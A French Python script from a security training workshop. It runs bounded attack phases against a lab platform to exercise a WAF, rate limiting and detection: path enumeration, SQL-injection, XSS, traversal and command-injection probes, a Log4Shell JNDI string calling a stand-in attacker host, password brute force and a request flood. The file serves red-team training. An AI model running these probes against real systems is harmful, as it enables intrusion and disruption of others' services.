"""Scénario d'attaque du workshop RESILIENCE-ALPHA, à lancer depuis le PC Attaquant (Kali).

Cadre : exercice pédagogique autorisé, contre la plateforme fictive du groupe et elle seule.
Objectif : produire des signaux mesurables (pare-feu, limitation de débit, échecs de connexion,
pic de trafic) que la supervision puis le détecteur ML doivent repérer, afin de déclencher la
remédiation automatique. Ce n'est pas un outil d'attaque réelle : les volumes sont bornés et réglables.

Usage depuis Kali :
    python3 attack_suite.py --target http://192.168.137.1:8080 --phase all
    python3 attack_suite.py --target http://192.168.137.1:8080 --phase whoami   # test de l'IP source
    python3 attack_suite.py --target http://192.168.137.1:8080 --phase recon,waf,bruteforce,flood

Chaque phase affiche un résumé (codes de réponse obtenus). Aucune donnée réelle n'est manipulée :
les identifiants sont volontairement faux, les charges utiles sont des sondes classiques bloquées par le WAF.
"""

import argparse
import http.client
import json
import random
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter
from urllib.parse import urlparse

UA = "resilience-redteam/1.0 (atelier autorise)"

# Console Windows : forcer l'UTF-8 pour les flèches et accents (sans effet sur Kali, déjà en UTF-8).
for stream in (sys.stdout, sys.stderr):
    try:
        stream.reconfigure(encoding="utf-8")
    except (AttributeError, ValueError):
        pass


def request(target, method, path, body=None, headers=None, timeout=10):
    """Envoie une requête et renvoie (code, duree_ms). Les erreurs réseau renvoient (0, duree)."""
    url = f"{target}{path}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", UA)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    start = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp.read()
            code = resp.status
    except urllib.error.HTTPError as err:
        code = err.code
    except (urllib.error.URLError, TimeoutError, ConnectionError):
        code = 0
    return code, (time.monotonic() - start) * 1000


def summary(name, codes):
    counts = Counter(codes)
    detail = ", ".join(f"{code or 'erreur réseau'}×{n}" for code, n in sorted(counts.items()))
    print(f"  [{name}] {len(codes)} requêtes → {detail}")
    return counts


# --------------------------------------------------------------------------- Phases

def phase_whoami(target, args):
    """Envoie une requête étiquetée pour retrouver l'IP source vue côté serveur.

    Sur le PC Hôte, cherchez l'étiquette dans les journaux :
        docker compose logs gateway | grep REDTEAM-WHOAMI
    puis comparez le client_ip affiché à l'IP réelle de Kali (ip a). S'ils diffèrent,
    Docker Desktop masque l'IP et le blocage devra s'appuyer sur d'autres critères.
    """
    tag = "REDTEAM-WHOAMI-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    print(f"Phase whoami — étiquette unique : {tag}")
    code, _ = request(target, "GET", f"/api/accounts/me?probe={tag}", headers={"X-Redteam-Probe": tag})
    print(f"  requête envoyée (code {code}). Cherchez « {tag} » dans les journaux de la passerelle sur le PC Hôte :")
    print(f'    docker compose logs gateway --since 2m | grep {tag}')
    return [code]


def phase_recon(target, args):
    """Balayage de chemins courants : énumération typique d'un attaquant (beaucoup de 404/403)."""
    print("Phase recon — balayage de chemins")
    paths = [
        "/", "/api", "/api/", "/admin", "/api/admin", "/.env", "/.git/config",
        "/api/internal/integrity", "/api/metrics", "/actuator/health", "/api/v1/users",
        "/wp-login.php", "/phpmyadmin/", "/api/payments/../internal/reconcile", "/server-status",
        "/api/auth/../../etc/passwd", "/config.json", "/backup.sql", "/api/debug",
    ]
    codes = []
    for path in paths:
        code, _ = request(target, "GET", path)
        codes.append(code)
        time.sleep(args.delay)
    return summary("recon", codes)


def phase_waf(target, args):
    """Sondes applicatives classiques (injection SQL, XSS, traversée de chemin, injection de commande).

    Elles visent un paramètre d'une route publique. Le pare-feu applicatif (OWASP CRS) doit
    renvoyer 403. C'est une démonstration de blocage, pas un contournement.
    """
    print("Phase waf — sondes bloquées par le pare-feu applicatif")
    payloads = [
        "' OR 1=1--", "' UNION SELECT NULL,version()--", "admin'--", "1; DROP TABLE accounts;--",
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
        "../../../../etc/passwd", "....//....//etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "; cat /etc/passwd", "| whoami", "$(id)", "`uname -a`",
        "{{7*7}}", "${jndi:ldap://attaquant/x}",
    ]
    codes = []
    for payload in payloads:
        q = urllib.parse.quote(payload)
        code, _ = request(target, "GET", f"/api/accounts/beneficiaries?q={q}")
        codes.append(code)
        time.sleep(args.delay)
    counts = summary("waf", codes)
    blocked = counts.get(403, 0)
    print(f"    → {blocked}/{len(codes)} sondes bloquées par le pare-feu (403)")
    return counts


def phase_bruteforce(target, args):
    """Tentatives de connexion répétées avec de faux mots de passe (déclenche le verrouillage)."""
    print(f"Phase bruteforce — {args.bruteforce} tentatives sur l'utilisateur « {args.user} »")
    wordlist = ["123456", "password", "admin", "azerty", "motdepasse", "qwerty",
                "letmein", "welcome", "root", "toor", "changeme", "P@ssw0rd"]
    codes = []
    for i in range(args.bruteforce):
        pwd = wordlist[i % len(wordlist)] + str(i)
        code, _ = request(target, "POST", "/api/auth/login",
                          body={"username": args.user, "password": pwd})
        codes.append(code)
        time.sleep(args.delay)
    counts = summary("bruteforce", codes)
    print("    → 401 = refusé, 429 = limité par la passerelle (anti force brute en action)")
    return counts


def phase_flood(target, args):
    """Pic de trafic court et borné pour déclencher la limitation de débit (429).

    Démonstration de disponibilité sous charge, pas un déni de service : nombre total et
    nombre de fils réglables, valeurs modestes par défaut. Chaque fil garde une connexion
    ouverte (keep-alive) pour atteindre un vrai débit de pic et solliciter la limite par IP.
    """
    print(f"Phase flood — {args.flood} requêtes, {args.threads} fils, pic de trafic borné")
    parsed = urlparse(target)
    host, port = parsed.hostname, parsed.port or 80
    path = "/api/accounts/me"  # route réelle sous limitation de débit ; sans jeton → 401 rapide
    codes = []
    lock = threading.Lock()
    per_thread = max(1, args.flood // args.threads)

    def worker():
        local = []
        conn = http.client.HTTPConnection(host, port, timeout=5)
        for _ in range(per_thread):
            try:
                conn.request("GET", path, headers={"User-Agent": UA})
                resp = conn.getresponse()
                resp.read()
                local.append(resp.status)
            except (http.client.HTTPException, OSError):
                local.append(0)
                try:
                    conn.close()
                    conn = http.client.HTTPConnection(host, port, timeout=5)
                except OSError:
                    break
        conn.close()
        with lock:
            codes.extend(local)

    threads = [threading.Thread(target=worker) for _ in range(args.threads)]
    start = time.monotonic()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    elapsed = time.monotonic() - start
    counts = summary("flood", codes)
    rate = len(codes) / elapsed if elapsed else 0
    print(f"    → {rate:.0f} req/s pendant {elapsed:.1f}s ; 429 = requêtes refusées par la limitation de débit")
    return counts


PHASES = {
    "whoami": phase_whoami,
    "recon": phase_recon,
    "waf": phase_waf,
    "bruteforce": phase_bruteforce,
    "flood": phase_flood,
}
DEFAULT_ORDER = ["whoami", "recon", "waf", "bruteforce", "flood"]


def main():
    parser = argparse.ArgumentParser(description="Scénario d'attaque du workshop (plateforme fictive autorisée).")
    parser.add_argument("--target", required=True,
                        help="URL de la passerelle du groupe, ex. http://192.168.137.1:8080")
    parser.add_argument("--phase", default="all",
                        help="all, ou liste séparée par des virgules : " + ", ".join(DEFAULT_ORDER))
    parser.add_argument("--user", default="bob", help="utilisateur visé par la force brute (compte de démo)")
    parser.add_argument("--bruteforce", type=int, default=12, help="nombre de tentatives de connexion")
    parser.add_argument("--flood", type=int, default=300, help="nombre total de requêtes du pic de trafic")
    parser.add_argument("--threads", type=int, default=10, help="nombre de fils pour le pic de trafic")
    parser.add_argument("--delay", type=float, default=0.3, help="pause entre requêtes des phases séquentielles (s)")
    parser.add_argument("--yes", action="store_true", help="ne pas demander de confirmation")
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if args.phase == "all":
        chosen = DEFAULT_ORDER
    else:
        chosen = [p.strip() for p in args.phase.split(",") if p.strip()]
        unknown = [p for p in chosen if p not in PHASES]
        if unknown:
            parser.error(f"phase(s) inconnue(s) : {', '.join(unknown)}")

    print("=" * 70)
    print("RESILIENCE-ALPHA — scénario d'attaque (exercice pédagogique autorisé)")
    print(f"Cible   : {target}")
    print(f"Phases  : {', '.join(chosen)}")
    print("=" * 70)
    if not args.yes:
        reply = input("Confirmer que cette cible est la plateforme du groupe, et vous seul ? [oui/non] ")
        if reply.strip().lower() not in ("oui", "o", "yes", "y"):
            print("Abandon.")
            return 1

    for name in chosen:
        print()
        PHASES[name](target, args)

    print("\nTerminé. Observez la Vue SOC de Grafana sur le PC Hôte (http://127.0.0.1:3000).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
